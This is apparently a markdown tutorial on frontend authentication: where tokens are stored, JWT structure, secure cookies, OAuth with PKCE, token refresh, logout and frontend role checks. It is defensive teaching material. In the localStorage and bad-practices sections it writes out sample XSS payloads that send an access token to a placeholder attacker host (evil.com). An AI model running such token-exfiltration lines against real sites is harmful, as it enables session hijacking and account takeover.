# 04 — Auth Patterns

> **"Authentication on the frontend is mostly about where you store the token and how you prove to the server who you are. The wrong storage choice opens you to XSS token theft. The wrong transmission choice opens you to CSRF. The right choice balances usability, security, and the threat model of your actual users."**

Frontend authentication patterns determine how your application acquires, stores, transmits, and refreshes identity credentials. Every choice involves tradeoffs: localStorage is convenient but XSS-vulnerable; HttpOnly cookies are XSS-resistant but CSRF-vulnerable; in-memory tokens are the most secure but require re-authentication after page refresh. This document covers every storage option, OAuth flows, JWT anatomy, token refresh strategies, session management, and the security implications of each architectural decision.

---

## 📚 Table of Contents

1. [Token Storage Options](#1-token-storage-options)
2. [JWT Deep Dive](#2-jwt-deep-dive)
3. [Cookie-Based Authentication](#3-cookie-based-authentication)
4. [OAuth 2.0 and OpenID Connect Flows](#4-oauth-20-and-openid-connect-flows)
5. [PKCE — Proof Key for Code Exchange](#5-pkce--proof-key-for-code-exchange)
6. [Token Refresh Strategies](#6-token-refresh-strategies)
7. [Silent Authentication and Session Recovery](#7-silent-authentication-and-session-recovery)
8. [Multi-Tab Session Synchronization](#8-multi-tab-session-synchronization)
9. [Logout — Complete Session Termination](#9-logout--complete-session-termination)
10. [Role-Based Access Control on the Frontend](#10-role-based-access-control-on-the-frontend)
11. [Good Practices](#11-good-practices)
12. [Bad Practices](#12-bad-practices)
13. [Common Mistakes](#13-common-mistakes)
14. [Interview-Level Explanation](#14-interview-level-explanation)
15. [Exercises](#15-exercises)

---

## 1. Token Storage Options

### Comparison Matrix

```
STORAGE OPTION          | XSS-safe? | CSRF-safe? | Persistent? | Notes
------------------------|-----------|------------|-------------|----------------------------------
Memory (JS variable)    | ✓         | ✓          | ✗           | Lost on page refresh
localStorage            | ✗         | ✓          | ✓           | XSS can steal it
sessionStorage          | ✗         | ✓          | Tab only    | Lost on tab close
HttpOnly Cookie         | ✓         | ✗          | ✓           | CSRF protection needed
Memory + Refresh Cookie | ✓         | Partial    | ✓           | Best of both worlds (see below)
```

### Option 1 — localStorage (Convenient, XSS-Vulnerable)

```javascript
// ✅ Simple implementation
localStorage.setItem("access_token", token);
const token = localStorage.getItem("access_token");

// Include in requests:
fetch("/api/data", {
  headers: { Authorization: `Bearer ${localStorage.getItem("access_token")}` },
});

// VULNERABILITY:
// <script>fetch('https://evil.com/steal?t=' + localStorage.getItem('access_token'))</script>
// Any XSS can steal the token → full account takeover

// USE WHEN:
// - Application has zero XSS risk (strict CSP, no user content)
// - Token is low-risk (read-only access, short-lived)
// - NEVER for financial, medical, or high-security applications
```

### Option 2 — HttpOnly Cookie (XSS-Resistant)

```javascript
// Server sets token in HttpOnly cookie:
res.cookie("access_token", jwt, {
  httpOnly: true, // JavaScript cannot read this
  secure: true, // HTTPS only
  sameSite: "Strict", // CSRF protection
  maxAge: 3600_000, // 1 hour
});

// Client: cookie sent automatically with every matching request
// No JavaScript needed to transmit the token

// TRADE-OFFS:
// ✓ XSS cannot steal the token (document.cookie doesn't include HttpOnly cookies)
// ✗ CSRF risk if sameSite is not Strict/Lax
// ✓ Works across all same-origin pages without code
// ✗ Third-party cookies (different subdomain) require careful configuration
```

### Option 3 — In-Memory Token (Most Secure)

```typescript
// Store access token ONLY in memory — never persists
let accessToken: string | null = null;

export function setAccessToken(token: string): void {
  accessToken = token;
}

export function getAccessToken(): string | null {
  return accessToken;
}

export function clearAccessToken(): void {
  accessToken = null;
}

// Include in all API requests:
const apiClient = axios.create();
apiClient.interceptors.request.use((config) => {
  if (accessToken) {
    config.headers["Authorization"] = `Bearer ${accessToken}`;
  }
  return config;
});

// DOWNSIDE: token lost on page refresh
// SOLUTION: pair with a refresh token in an HttpOnly cookie
// → Refresh token is XSS-proof; access token is short-lived
```

### Option 4 — Best Practice: Memory + HttpOnly Refresh Token

```
ARCHITECTURE:
  Access Token: stored in JavaScript memory only (short-lived: 5-15 minutes)
  Refresh Token: stored in HttpOnly cookie (long-lived: 7-30 days)

SECURITY PROPERTIES:
  XSS attack: can read memory? YES — but access token expires in 5-15 min
              can read HttpOnly cookie? NO — refresh token is safe
  CSRF attack: can use refresh cookie? YES, but refresh endpoint:
               - Returns new tokens (doesn't read sensitive data)
               - Can be protected with SameSite=Strict

FLOW:
  1. User logs in → server returns:
     - Access token in JSON response (stored in memory)
     - Refresh token in HttpOnly cookie
  2. User makes API calls with access token in Authorization header
  3. Access token expires → client uses refresh cookie to get new access token
  4. Page refresh → access token is gone → client silently refreshes using cookie

RESULT:
  - XSS cannot steal long-lived refresh token (HttpOnly)
  - CSRF cannot access API (Authorization header, not cookie, authenticates)
  - Survives page refresh (refresh cookie persists)
```

---

## 2. JWT Deep Dive

### JWT Structure

```
HEADER.PAYLOAD.SIGNATURE

Example token:
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VySWQiOiI0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzA4MDM2ODAwfQ.
HMAC_SIGNATURE

HEADER (base64url-decoded):
{
  "alg": "RS256",   // signing algorithm
  "typ": "JWT"
}

PAYLOAD (base64url-decoded):
{
  "userId":   "42",              // subject claim
  "role":     "user",            // custom claim
  "iss":      "https://auth.example.com",  // issuer
  "aud":      "https://api.example.com",   // audience
  "iat":      1707950400,        // issued at (unix timestamp)
  "exp":      1708036800,        // expiry (1 hour after iat)
  "jti":      "unique-id-abc"    // JWT ID (for revocation)
}

SIGNATURE:
  RS256: RSA private key signs header.payload
  HS256: shared secret signs header.payload

  Verification: decode header/payload (base64), verify signature
  The payload is NOT encrypted — only signed
  Anyone can read the payload (base64 is not encryption)
```

### JWT Validation (Frontend)

```typescript
// WARNING: Never trust JWT claims without verifying the signature server-side
// Frontend "validation" is only for UX purposes (e.g., showing expiry)
// All authorization decisions MUST happen on the server

function decodeJWTPayload(token: string): Record<string, unknown> | null {
  try {
    const parts = token.split(".");
    if (parts.length !== 3) return null;
    // base64url → base64 → decode
    const payload = atob(parts[1].replace(/-/g, "+").replace(/_/g, "/"));
    return JSON.parse(payload);
  } catch {
    return null;
  }
}

function isJWTExpired(token: string): boolean {
  const payload = decodeJWTPayload(token);
  if (!payload?.exp) return true; // no expiry = treat as expired
  return Date.now() / 1000 >= (payload.exp as number);
}

// Usage: proactively refresh before expiry
function getTokenExpiryMs(token: string): number {
  const payload = decodeJWTPayload(token);
  if (!payload?.exp) return 0;
  return (payload.exp as number) * 1000 - Date.now();
}

// Schedule refresh 1 minute before expiry
const msUntilExpiry = getTokenExpiryMs(accessToken);
setTimeout(refreshAccessToken, Math.max(0, msUntilExpiry - 60_000));
```

---

## 3. Cookie-Based Authentication

### Secure Cookie Configuration

```javascript
// Server: complete secure cookie configuration
function setAuthCookie(res, token, type = "session") {
  const options = {
    httpOnly: true, // no JS access
    secure: true, // HTTPS only
    sameSite: "Strict", // CSRF protection
    path: "/", // entire site
  };

  if (type === "persistent") {
    options.maxAge = 7 * 24 * 3600 * 1000; // 7 days
  } else {
    // Session cookie: no maxAge → expires when browser closes
    // Note: browsers may restore sessions; for strict session-end behavior
    //       consider short maxAge (e.g., 24h) even for "session" cookies
  }

  res.cookie("session", token, options);
}

// Refresh token: longer-lived, HttpOnly
function setRefreshCookie(res, refreshToken) {
  res.cookie("refresh_token", refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: "Strict",
    path: "/api/auth/refresh", // only sent to refresh endpoint
    maxAge: 30 * 24 * 3600 * 1000, // 30 days
  });
}
```

### Cookie-Based Auth Flow

```
LOGIN:
  POST /api/auth/login
  Body: { email, password }
  Response:
    Set-Cookie: session=JWT; HttpOnly; Secure; SameSite=Strict
    Body: { user: { id, name, email } } (no token in body)

API CALLS:
  GET /api/user/profile
  Cookie: session=JWT (sent automatically by browser)
  (no Authorization header needed)

LOGOUT:
  POST /api/auth/logout
  Response: Set-Cookie: session=; Max-Age=0 (clears cookie)

CSRF PROTECTION WITH COOKIE AUTH:
  SameSite=Strict: blocks cross-site form submissions automatically
  Double-submit cookie: XSRF-TOKEN cookie + X-XSRF-TOKEN header
```

---

## 4. OAuth 2.0 and OpenID Connect Flows

### Authorization Code Flow (Standard)

```
AUTHORIZATION CODE FLOW (for server-side web apps):

  1. Client → Authorization Server:
     GET https://auth.provider.com/authorize?
       response_type=code
       &client_id=CLIENT_ID
       &redirect_uri=https://app.example.com/callback
       &scope=openid profile email
       &state=RANDOM_STATE_VALUE  ← CSRF protection
       &code_challenge=CODE_CHALLENGE  ← PKCE (see Section 5)
       &code_challenge_method=S256

  2. User authenticates at auth provider

  3. Authorization Server → Client (redirect):
     https://app.example.com/callback?
       code=AUTHORIZATION_CODE
       &state=RANDOM_STATE_VALUE  ← verify this matches

  4. Client Server → Authorization Server (token exchange):
     POST https://auth.provider.com/token
     Body: {
       grant_type: 'authorization_code',
       code: AUTHORIZATION_CODE,
       redirect_uri: 'https://app.example.com/callback',
       client_id: CLIENT_ID,
       client_secret: CLIENT_SECRET,  ← only in server-side apps
       code_verifier: CODE_VERIFIER   ← PKCE
     }

  5. Authorization Server → Client Server:
     {
       access_token: JWT,
       id_token: JWT,        ← OpenID Connect
       refresh_token: ...,
       expires_in: 3600
     }
```

### Implicit Flow (Deprecated — Don't Use)

```
IMPLICIT FLOW (DO NOT USE for new applications):

  GET /authorize?response_type=token&...
  → Token returned directly in URL fragment:
  https://app.example.com/callback#access_token=TOKEN

  PROBLEMS:
  - Token in URL: logged in browser history, server logs, Referer headers
  - No client_secret verification (any site can impersonate)
  - No refresh tokens
  - Deprecated in OAuth 2.1 spec

  REPLACEMENT: Authorization Code + PKCE (works for SPAs without secrets)
```

---

## 5. PKCE — Proof Key for Code Exchange

PKCE (RFC 7636) protects the Authorization Code flow for public clients (SPAs, native apps) that can't store a client secret.

```typescript
// PKCE implementation for SPAs

// Step 1: Generate code verifier (random secret)
function generateCodeVerifier(): string {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return btoa(String.fromCharCode(...array))
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=/g, "");
}

// Step 2: Create code challenge (SHA-256 hash of verifier)
async function generateCodeChallenge(verifier: string): Promise<string> {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const digest = await crypto.subtle.digest("SHA-256", data);
  return btoa(String.fromCharCode(...new Uint8Array(digest)))
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=/g, "");
}

// Auth flow in SPA:
async function initiateLogin() {
  const codeVerifier = generateCodeVerifier();
  const codeChallenge = await generateCodeChallenge(codeVerifier);
  const state = crypto.randomUUID(); // CSRF protection

  // Store verifier and state for callback validation
  sessionStorage.setItem("pkce_verifier", codeVerifier);
  sessionStorage.setItem("oauth_state", state);

  // Redirect to authorization server
  const params = new URLSearchParams({
    response_type: "code",
    client_id: CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    scope: "openid profile email",
    state,
    code_challenge: codeChallenge,
    code_challenge_method: "S256",
  });

  window.location.href = `https://auth.provider.com/authorize?${params}`;
}

// Handle callback:
async function handleCallback() {
  const params = new URLSearchParams(window.location.search);
  const code = params.get("code");
  const returnedState = params.get("state");
  const savedState = sessionStorage.getItem("oauth_state");
  const codeVerifier = sessionStorage.getItem("pkce_verifier");

  // Validate state (CSRF protection)
  if (!returnedState || returnedState !== savedState) {
    throw new Error("State mismatch — possible CSRF attack");
  }

  // Clean up
  sessionStorage.removeItem("oauth_state");
  sessionStorage.removeItem("pkce_verifier");

  // Exchange code for tokens (via your backend, not directly from SPA)
  const tokens = await exchangeCode(code, codeVerifier);
  return tokens;
}

// In a SPA: exchange code via YOUR backend (keeps client_id safe from users)
async function exchangeCode(code: string, verifier: string) {
  const response = await fetch("/api/auth/callback", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ code, codeVerifier: verifier }),
  });
  return response.json(); // server returns user info, stores tokens in HttpOnly cookies
}
```

---

## 6. Token Refresh Strategies

### Proactive Refresh (Timer-Based)

```typescript
class TokenManager {
  #accessToken: string | null = null;
  #refreshTimeout: ReturnType<typeof setTimeout> | null = null;
  #refreshFn: () => Promise<string>;

  constructor(refreshFn: () => Promise<string>) {
    this.#refreshFn = refreshFn;
  }

  setToken(token: string): void {
    this.#accessToken = token;
    this.#scheduleRefresh(token);
  }

  getToken(): string | null {
    return this.#accessToken;
  }

  #scheduleRefresh(token: string): void {
    if (this.#refreshTimeout) clearTimeout(this.#refreshTimeout);

    const expiryMs = this.#getExpiryMs(token);
    const refreshAt = Math.max(0, expiryMs - 60_000); // 1 minute before expiry

    this.#refreshTimeout = setTimeout(async () => {
      try {
        const newToken = await this.#refreshFn();
        this.setToken(newToken);
      } catch (err) {
        console.error("Token refresh failed:", err);
        this.clear();
        // Emit auth-expired event for application to handle
        window.dispatchEvent(new CustomEvent("auth:session-expired"));
      }
    }, refreshAt);
  }

  #getExpiryMs(token: string): number {
    try {
      const payload = JSON.parse(atob(token.split(".")[1]));
      return payload.exp * 1000 - Date.now();
    } catch {
      return 0;
    }
  }

  clear(): void {
    this.#accessToken = null;
    if (this.#refreshTimeout) clearTimeout(this.#refreshTimeout);
  }
}
```

### Reactive Refresh (Interceptor-Based)

```typescript
// Refresh on 401 response
let isRefreshing = false;
let refreshQueue: Array<(token: string) => void> = [];

apiClient.interceptors.response.use(
  (response) => response,
  async (error) => {
    const original = error.config;

    if (error.response?.status !== 401 || original._retry) {
      return Promise.reject(error);
    }

    if (isRefreshing) {
      // Another refresh is in progress — queue this request
      return new Promise((resolve) => {
        refreshQueue.push((newToken: string) => {
          original.headers["Authorization"] = `Bearer ${newToken}`;
          resolve(apiClient(original));
        });
      });
    }

    original._retry = true;
    isRefreshing = true;

    try {
      const newToken = await refreshAccessToken();
      tokenManager.setToken(newToken);

      // Retry queued requests with new token
      refreshQueue.forEach((cb) => cb(newToken));
      refreshQueue = [];

      original.headers["Authorization"] = `Bearer ${newToken}`;
      return apiClient(original);
    } catch (refreshError) {
      // Refresh failed: clear auth state, redirect to login
      refreshQueue = [];
      tokenManager.clear();
      window.location.href = "/login?reason=session-expired";
      return Promise.reject(refreshError);
    } finally {
      isRefreshing = false;
    }
  },
);

async function refreshAccessToken(): Promise<string> {
  const response = await fetch("/api/auth/refresh", {
    method: "POST",
    credentials: "include", // sends HttpOnly refresh cookie
  });

  if (!response.ok) throw new Error(`Refresh failed: ${response.status}`);

  const { accessToken } = await response.json();
  return accessToken;
}
```

---

## 7. Silent Authentication and Session Recovery

```typescript
// On page load: attempt to restore session without visible login
async function initializeAuth(): Promise<User | null> {
  try {
    // Try to refresh using the existing refresh cookie (HttpOnly)
    const response = await fetch('/api/auth/refresh', {
      method:      'POST',
      credentials: 'include',
    });

    if (!response.ok) {
      // No valid refresh token: user needs to log in
      return null;
    }

    const { accessToken, user } = await response.json();
    tokenManager.setToken(accessToken);
    return user;
  } catch {
    return null;
  }
}

// App initialization:
function App() {
  const [authState, setAuthState] = useState<'loading' | 'authenticated' | 'unauthenticated'>('loading');
  const [user, setUser]           = useState<User | null>(null);

  useEffect(() => {
    initializeAuth()
      .then(user => {
        setUser(user);
        setAuthState(user ? 'authenticated' : 'unauthenticated');
      })
      .catch(() => setAuthState('unauthenticated'));
  }, []);

  if (authState === 'loading') return <AppSkeleton />;
  if (authState === 'unauthenticated') return <LoginPage />;
  return <AuthenticatedApp user={user!} />;
}
```

---

## 8. Multi-Tab Session Synchronization

```typescript
// Sync auth state across browser tabs
class CrossTabAuthSync {
  #channel = new BroadcastChannel("auth-sync");

  constructor(private store: AuthStore) {
    this.#channel.onmessage = this.#handleMessage.bind(this);
  }

  // Broadcast logout to all tabs
  broadcastLogout(): void {
    this.#channel.postMessage({ type: "LOGOUT" });
    this.store.clearAuth();
  }

  // Broadcast new token to all tabs (one tab refreshed)
  broadcastNewToken(accessToken: string): void {
    this.#channel.postMessage({ type: "TOKEN_REFRESHED", accessToken });
  }

  #handleMessage(event: MessageEvent): void {
    switch (event.data.type) {
      case "LOGOUT":
        // Another tab logged out: clear auth here too
        this.store.clearAuth();
        window.location.href = "/login";
        break;

      case "TOKEN_REFRESHED":
        // Another tab refreshed the token: use the new one
        tokenManager.setToken(event.data.accessToken);
        break;
    }
  }

  destroy(): void {
    this.#channel.close();
  }
}

// storageEvent: listen for localStorage changes across tabs
// (alternative to BroadcastChannel for older browsers)
window.addEventListener("storage", (event) => {
  if (event.key === "auth:logout" && event.newValue === "true") {
    // Another tab set this flag: log out here
    handleLogoutFromOtherTab();
    localStorage.removeItem("auth:logout");
  }
});
```

---

## 9. Logout — Complete Session Termination

```typescript
// Complete logout: clear everything
async function logout() {
  try {
    // 1. Tell server to invalidate refresh token
    await fetch("/api/auth/logout", {
      method: "POST",
      credentials: "include", // sends refresh cookie for server to revoke
      headers: { Authorization: `Bearer ${tokenManager.getToken()}` },
    });
  } catch (err) {
    // Server unavailable: still clear client-side state
    console.error("Server logout failed:", err);
  }

  // 2. Clear in-memory access token
  tokenManager.clear();

  // 3. Clear any localStorage auth data
  localStorage.removeItem("user");
  localStorage.removeItem("access_token");

  // 4. Clear sessionStorage
  sessionStorage.clear();

  // 5. Notify other tabs
  crossTabSync.broadcastLogout();

  // 6. Redirect to login
  window.location.href = "/login";
}

// Server-side logout:
app.post("/api/auth/logout", authenticate, async (req, res) => {
  // Revoke refresh token in database
  await db.refreshTokens.delete(req.cookies.refresh_token);

  // Clear the refresh cookie
  res.clearCookie("refresh_token", {
    httpOnly: true,
    secure: true,
    sameSite: "Strict",
  });
  res.clearCookie("session", {
    httpOnly: true,
    secure: true,
    sameSite: "Strict",
  });

  // Blacklist access token until expiry (optional, for strict requirements)
  await cache.set(
    `revoked:${req.user.jti}`,
    true,
    req.user.exp - Math.floor(Date.now() / 1000),
  );

  res.status(204).end();
});
```

---

## 10. Role-Based Access Control on the Frontend

```typescript
// Frontend RBAC: for UX only — all authorization enforced server-side

interface User {
  id:          string;
  roles:       string[];
  permissions: string[];
}

// Permission check hooks
function usePermission(permission: string): boolean {
  const user = useCurrentUser();
  return user?.permissions.includes(permission) ?? false;
}

function useRole(role: string): boolean {
  const user = useCurrentUser();
  return user?.roles.includes(role) ?? false;
}

// Guard components
function PermissionGate({ permission, children, fallback = null }: PermissionGateProps) {
  const hasPermission = usePermission(permission);
  return hasPermission ? <>{children}</> : <>{fallback}</>;
}

function AdminGate({ children, fallback = null }: { children: ReactNode; fallback?: ReactNode }) {
  const isAdmin = useRole('admin');
  return isAdmin ? <>{children}</> : <>{fallback}</>;
}

// Usage:
function UserManagementPage() {
  return (
    <div>
      <UserList />
      <PermissionGate permission="users.create" fallback={<UpgradePrompt />}>
        <CreateUserButton />
      </PermissionGate>
      <AdminGate>
        <DangerZone />
      </AdminGate>
    </div>
  );
}

// Route-level protection:
function ProtectedRoute({ permission, element }: { permission: string; element: ReactNode }) {
  const hasPermission = usePermission(permission);
  if (!hasPermission) return <Navigate to="/unauthorized" replace />;
  return <>{element}</>;
}
```

### Critical Note on Frontend RBAC

```
FRONTEND RBAC = UX OPTIMIZATION ONLY

Frontend permission checks:
  ✓ Hide UI elements the user can't access
  ✓ Redirect unauthorized users to appropriate pages
  ✓ Improve UX by not showing broken buttons

Frontend permission checks DO NOT:
  ✗ Prevent access to APIs (any user can call APIs directly)
  ✗ Protect data from determined attackers
  ✗ Substitute for server-side authorization

The server MUST validate permissions on every API request.
A user who modifies frontend JavaScript can bypass all client-side checks.
ALWAYS verify authorization server-side.
```

---

## 11. Good Practices

### ✅ Use the memory + HttpOnly refresh token pattern

```typescript
// ✅ Best balance of security and usability
// Access token: in memory (safe from XSS, short-lived)
// Refresh token: HttpOnly cookie (safe from XSS, used to get new access tokens)
```

### ✅ Validate state parameter in OAuth flows

```typescript
// ✅ Always validate state parameter in OAuth callbacks
const returnedState = searchParams.get("state");
const savedState = sessionStorage.getItem("oauth_state");

if (!returnedState || returnedState !== savedState) {
  throw new Error("Potential CSRF attack — state mismatch");
}
sessionStorage.removeItem("oauth_state");
```

### ✅ Clear sensitive data on logout

```typescript
// ✅ Clear all auth data on logout
tokenManager.clear();
queryClient.clear(); // TanStack Query cache
sessionStorage.clear();
// Don't clearCache for localStorage unless you have auth data there
```

### ✅ Handle token expiry gracefully with queuing

```typescript
// ✅ Queue requests during token refresh, don't fail them
// See the reactive refresh interceptor pattern above
```

---

## 12. Bad Practices

### ❌ Storing JWT in localStorage for sensitive applications

```javascript
// ❌ XSS can steal the token
localStorage.setItem("auth_token", jwt);

// Any XSS payload can run:
// fetch('https://evil.com?token=' + localStorage.getItem('auth_token'))
// → attacker impersonates user until token expires
```

### ❌ Trusting frontend role checks for security

```javascript
// ❌ Frontend check as the ONLY authorization
if (user.role === "admin") {
  deleteAllData(); // no server-side check!
}
// Any user can set user.role = 'admin' in browser console
```

### ❌ Long-lived access tokens without refresh

```javascript
// ❌ 24-hour access token in localStorage
// Window for exploit: 24 hours
// If XSS occurs at hour 1: attacker has 23 hours of access

// ✅ Short-lived access tokens (5-15 minutes) + refresh
// Even if stolen, expires quickly
```

---

## 13. Common Mistakes

### Mistake 1 — Not invalidating tokens on the server at logout

```javascript
// ❌ Client-side only logout
function logout() {
  localStorage.removeItem("token"); // removed from client
  // Token still valid on server! If someone captured it, they can still use it
}

// ✅ Server-side logout: invalidate refresh token, blacklist JWTs
await fetch("/api/auth/logout", {
  method: "POST",
  credentials: "include",
});
// Server deletes refresh token from DB, blacklists access token until expiry
```

### Mistake 2 — Multiple simultaneous refresh requests

```javascript
// ❌ Five parallel requests all get 401 → all try to refresh simultaneously
// Race condition: multiple refresh tokens issued and used

// ✅ Queue concurrent refreshes (see interceptor pattern)
// One refresh at a time; others wait for the result
```

### Mistake 3 — Allowing access tokens as URL parameters

```javascript
// ❌ Token in URL: leaked via Referer, browser history, logs
window.location.href = `/callback?token=${accessToken}`;

// In logs: GET /callback?token=eyJhbGciOiJ... HTTP/1.1

// ✅ Token in POST body or Authorization header only
// OAuth: use fragment (#token=...) or POST-to-redirect, never query params
```

---

## 14. Interview-Level Explanation

> **"How do you handle authentication in a React SPA? Where do you store tokens?"**

**Strong answer:**

> "Token storage for SPAs involves a fundamental tradeoff: localStorage is convenient but XSS-stealable; HttpOnly cookies are XSS-resistant but need CSRF protection; in-memory storage is the most secure but is lost on page refresh.
>
> My preferred approach for production applications is the memory plus HttpOnly refresh token pattern. The access token lives only in a JavaScript variable — it's never written to localStorage or sessionStorage, so even if XSS occurs, the attacker can only use the access token for however long it's valid, which I keep short: five to fifteen minutes. The refresh token lives in an HttpOnly cookie, which JavaScript cannot read at all, so XSS can't steal it. The cookie has SameSite=Strict to prevent CSRF. On page refresh, the access token is gone from memory, but the application silently POSTs to the refresh endpoint, the browser sends the HttpOnly refresh cookie, and the server returns a new access token.
>
> For OAuth flows — login via Google, GitHub, Auth0 — I use the Authorization Code flow with PKCE. PKCE replaces the client secret for public clients like SPAs. The client generates a random code verifier, hashes it to create a challenge, includes the challenge in the authorization request, and proves possession of the verifier when exchanging the authorization code for tokens. This prevents authorization code interception attacks. I also validate the state parameter to prevent CSRF during the OAuth redirect.
>
> For token refresh: I implement a proactive refresh scheduled one minute before expiry, and a reactive refresh interceptor that handles 401 responses by queuing concurrent requests while one refresh runs, then retrying all queued requests with the new token. This prevents the race condition where multiple parallel requests all try to refresh simultaneously.
>
> Logout requires clearing the client state — the in-memory token, the TanStack Query cache, any sessionStorage — telling the server to revoke the refresh token, and broadcasting the logout to other tabs via BroadcastChannel. The server blacklists the access token until it naturally expires.
>
> Frontend RBAC — showing and hiding UI based on user roles — is purely a UX concern. The server must enforce authorization on every API request. A user can modify JavaScript to bypass any client-side check."

---

## 15. Exercises

### Exercise 1 — Design an auth architecture

Design the auth architecture for a multi-tenant SaaS application:

- Users can be members of multiple organizations
- Each organization has roles (owner, admin, member, viewer)
- Some features are plan-gated (basic, pro, enterprise)
- Mobile app and web app both use the same API
- Users should stay logged in for 30 days

Define: token strategy, what goes in the JWT payload, refresh token handling, and how the frontend enforces plan/role gates.

<details>
<summary>Solution</summary>

```typescript
// JWT PAYLOAD DESIGN:
interface JWTPayload {
  // Standard claims
  sub:  string;         // userId
  iss:  string;         // 'https://auth.example.com'
  aud:  string;         // 'https://api.example.com'
  iat:  number;         // issued at
  exp:  number;         // +15 minutes for access tokens
  jti:  string;         // unique ID for revocation

  // Custom claims
  email:     string;
  activeOrg: string;    // currently active organization ID
  orgRole:   'owner' | 'admin' | 'member' | 'viewer';
  plan:      'basic' | 'pro' | 'enterprise';
  permissions: string[]; // effective permissions for activeOrg
}

// TOKEN STRATEGY:
// Access token:    in memory only, 15-minute expiry
// Refresh token:   HttpOnly cookie, 30-day expiry
//                  Rotated on each use (refresh token rotation)
//                  Server stores refresh token hash in DB
//                  Mobile: secure storage (Keychain/Keystore), not cookies

// REFRESH TOKEN ROTATION:
// Each refresh call: old token is revoked, new token issued
// Reuse detection: if old token used again → all tokens for user are revoked
// Prevents: stolen refresh token being silently reused

// ORGANIZATION SWITCHING:
async function switchOrganization(orgId: string) {
  const response = await apiClient.post('/api/auth/switch-org', { orgId });
  const { accessToken } = response.data;
  // New access token with new activeOrg + orgRole + permissions
  tokenManager.setToken(accessToken);
  queryClient.clear(); // clear all cached data from previous org
}

// FRONTEND GATES:
function PlanGate({ plan, children, fallback }) {
  const { plan: userPlan } = useCurrentUser();
  const planOrder = { basic: 0, pro: 1, enterprise: 2 };
  const hasAccess = planOrder[userPlan] >= planOrder[plan];
  return hasAccess ? children : fallback ?? <UpgradeModal requiredPlan={plan} />;
}

function OrgPermissionGate({ permission, children }) {
  const { permissions } = useCurrentUser();
  return permissions.includes(permission) ? children : null;
}

// Usage:
<PlanGate plan="pro">
  <AdvancedAnalytics />
</PlanGate>

<OrgPermissionGate permission="members.invite">
  <InviteMemberButton />
</OrgPermissionGate>

// MOBILE AUTH:
// Native app: cannot use HttpOnly cookies easily
// Instead: store refresh token in iOS Keychain / Android Keystore
// Use React Native's SecureStore or equivalent
// Access token: in-memory (React state or context)
// Same 15-min/30-day strategy, different storage mechanism
```

</details>

---

## 🔗 Related Topics

- [`security/01-xss.md`](./01-xss.md) — XSS can steal localStorage tokens
- [`security/02-csrf.md`](./02-csrf.md) — CSRF affects cookie-based auth
- [`security/03-headers.md`](./03-headers.md) — Cookie security headers
- [`system-design/04-state-management-design.md`](../system-design/04-state-management-design.md) — Auth state management
- [`networking/02-fetch-and-xhr.md`](../networking/02-fetch-and-xhr.md) — Fetch credentials and auth headers

---

<div align="center">

**`security/` section complete!** 🎉

All 4 security files done:
`01-xss.md` · `02-csrf.md` · `03-headers.md` · **`04-auth-patterns.md`** ✓

**Next section:** [`animations/`](../animations/) →

</div>
